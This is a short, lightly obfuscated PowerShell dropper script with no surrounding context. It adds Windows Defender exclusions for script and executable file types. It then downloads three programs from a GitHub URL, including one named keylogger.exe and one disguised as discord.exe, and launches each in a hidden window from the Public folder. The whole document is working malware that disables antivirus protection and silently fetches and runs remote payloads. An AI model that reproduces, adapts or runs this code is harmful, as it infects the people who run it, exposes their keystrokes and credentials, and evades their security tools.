$z="Add-MpPreference";$x="-ExclusionExtension";&$z $x ".ps1";&$z $x ".exe";&$z $x ".dll";&$z $x ".lnk";
$u="Invoke-WebRequest";$v="-Uri";$w="-OutFile";$y="Start-Process";$a="-FilePath";$b="-WindowStyle";$c="Hidden";
&$u $v "https://github.com/hackyitpro/main/raw/refs/heads/main/venom.exe" $w "C:\Users\Public\venom1.exe";&$y $a "C:\Users\Public\venom1.exe" $b $c;
&$u $v "https://github.com/hackyitpro/main/raw/refs/heads/main/discord.exe" $w "C:\Users\Public\discord.exe";&$y $a "C:\Users\Public\discord.exe" $b $c;
&$u $v "https://github.com/hackyitpro/main/raw/refs/heads/main/keylogger.exe" $w "C:\Users\Public\keylogger.exe";&$y $a "C:\Users\Public\keylogger.exe" $b $c;
